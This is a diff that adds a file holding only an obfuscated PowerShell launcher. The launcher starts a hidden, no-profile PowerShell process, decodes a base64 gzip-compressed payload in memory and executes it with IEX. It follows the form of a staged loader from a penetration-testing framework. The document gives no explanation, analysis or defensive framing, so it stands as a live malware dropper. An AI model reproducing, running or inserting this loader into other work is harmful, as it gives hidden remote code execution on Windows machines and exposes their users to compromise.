@@ -1,0 +1,20 @@
+---
+
+powershell.exe -nop -w hidden -c 'if([IntPtr]::Size -eq 4){$b=''powershell.exe''}else{$b=$env:windir+''\syswow64\WindowsPowerShell\v1.0\powershell.exe''};$s=N
+ew-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments=''-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''''H
+4sIAIf28lkCA7VWbW/aSBD+nEr9D1aFZFtyeAttrpEqnQ04OOAU4mACFFUbew0Lay+s1+Gl1/9+Y7AToqRVrtJZidj1zOzOPs8zsw6SyBOERRLn96vvRiL9eP/upIs4CiWlELZCRkJNKgQ7u7tqnqsnJ2AtYEG
+Wt9IXSRnry2WDhYhEk4uLesI5jsRhXrzEQo9jHN5TgmNFlf6RBjPM8enX+zn2hPRDKnwvXlJ2j2jmtq0jb4alUz3yU1uHeSjNq+gsKRGK/O2brI5PK5Nic5UgGiuys40FDos+pbIq/VTTDW+3S6zINvE4i1kgi
+gMSnVWL/ShGAb6G1R6wjcWM+bGswjHgj2OR8Eg6HChd4WBXZBh2OfN03+c4BveiFT2wBVYKUUKpJv2tjLPtb5JIkBCDXWDOlg7mD8TDcbGFIp/iGxxMlGu8zk/91iDlOAi8uoKrGvDxWp428xOKD6Gy+jLTjEQ
+VniMiAYCf79+9fxfk9Ps11+tZ/jI8FgCMTsb7MYZMlS6Lyd75i1TWJBu2RILxLUwLtzzB6kQapxSMJxOpsHDai+1gpv16iUruD96r6g7Bq7HLiD+BkIyfQuhuK/XU8GuhNXBAItzYRigkXq4l5TXUcUDx/rDF3
+O0aslLkzID9BqZ4ikQKoyaNX4Y1QyIeY42EUB9z3QPmYsgKSFWfJ3NgRpGtyMYh4HSYyykLoGCce2eq3ea7p3NwkusUxbEmdRMoIU+THIwo9jVJj2KSmfREsP1QfkrXTqggHopFvtxEfQQy27DOoljwxAPu4PC
+3zhJ7BNEUC01qER8bW4dM843lV5GoI0pJNIWVHoAJeJMi4IhUERxyzNlXiw4WVrikOAS3fT2bFE2herMS2KsITbEvv8gyl/hBzykgORJHOQLLDmVCk1zCBfSFFNxUS3+cwlFTOCRT5zjjRMlrZmxsRSrywiKp9
+9d+iJrnqUQzlPaYcAF4mJyFBorxp5ojOKClfCh9JXUdnqEVUdszFqSir0nFsuG/T84s1jj321fzVok3NrNAt2LLbnUbvVar9nDluDXhNC3R7lrCbt7N547euukPxcjSW7ekvBjWdssrsnM6uj/clD7tjN26bGx
+286kfDBtBMD0PnJvKR5N0BvWeUa6iTqOZdAbG2ijX4iZZt3qk31tcmeJ+6FLUD0rTu8pnRDYdPncrzN5Zun45O/N2V4F7ObP97bBV+jyoLfSmrtejpmsarD00uN4tuWjqsnV7Wi+H07pumPcEj3p90+j1TEPvX
+85Xjc+lKcTeoZkxcKtktLy7mcHchBTsUrlm+XjD/uoMiPuQrmWsDHN0h/TOaGuWSpVhXEULg+kGgGiOVpDTcGl2KcTf9qtMd+n1k2+v1Wh7o8p5bH/5kFIL3BY2H+eb6t19J0Efjyj7VT+2EY9niAKV0GfzejI
+ZN7Om2WUkjVCU/O5cYB5hCncO3Eq5JHVKmZd276cOC9fHoalPoLj6MDyrvjpSpUdH9amz568uLkaQbar0RxkWOziaiplW3pyVy9Ciy5taGY7+9nPW2XKrHC2opY3+GLXn29H9dmpaFIV42a5Up/3/HdasIGfw4
+78J1qd3v7G+Ceqy9gyKF9bnL/4T8H+CxAARAc4OtBaKD3fdbwDJJHX0hZAxBmoJsif9TPuaiNNr+Hb4Fw2eMVYZCgAA''''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.Gz
+ipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=''Hidden''
+;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);'
+
+
+---
